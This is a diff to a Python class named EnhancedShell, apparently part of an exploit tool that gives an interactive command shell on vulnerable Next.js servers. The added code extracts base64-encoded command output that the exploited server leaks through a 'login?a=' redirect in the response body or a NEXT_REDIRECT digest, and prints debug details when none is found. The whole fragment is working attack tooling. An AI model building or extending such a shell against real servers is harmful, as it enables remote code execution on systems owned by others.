@@ -153,8 +153,42 @@ class EnhancedShell:
                     return decoded.strip()
                 except Exception as e:
                     return f"{RED}[-] Failed to decode output: {e}{RESET}"
-            else:
-                return f"{YELLOW}[!] No output in response (Status: {response.status_code}){RESET}"
+
+            # 3. Check response body for RSC stream redirect (some Next.js versions)
+            body_text = response.text
+            body_match = re.search(r'login\?a=(.*?)(?:;|"|$)', body_text)
+            if body_match:
+                output_b64 = body_match.group(1)
+                try:
+                    decoded = base64.b64decode(unquote(output_b64)).decode('utf-8', errors='ignore')
+                    return decoded.strip()
+                except Exception as e:
+                    return f"{RED}[-] Failed to decode body output: {e}{RESET}"
+
+            # 4. Check for NEXT_REDIRECT digest in body
+            digest_match = re.search(r'digest[`"\s:]+([A-Za-z0-9+/=]+)', body_text)
+            if digest_match:
+                try:
+                    decoded = base64.b64decode(digest_match.group(1)).decode('utf-8', errors='ignore')
+                    return decoded.strip()
+                except Exception:
+                    pass
+
+            # Debug: show what we got
+            debug_info = []
+            if response.headers:
+                for h in ['X-Action-Redirect', 'Location', 'X-Next-Redirect']:
+                    val = response.headers.get(h, '')
+                    if val:
+                        debug_info.append(f"  {h}: {val}")
+            
+            body_preview = body_text[:300] if body_text else "(empty)"
+            return (
+                f"{YELLOW}[!] No output in response (Status: {response.status_code}){RESET}\n"
+                f"{YELLOW}[DEBUG] Headers with redirect info:{RESET}\n"
+                + ('\n'.join(debug_info) if debug_info else '  (none)') + '\n'
+                f"{YELLOW}[DEBUG] Body preview:{RESET}\n  {body_preview}"
+            )
                 
         except requests.exceptions.Timeout:
             return f"{RED}[-] Request timed out{RESET}"
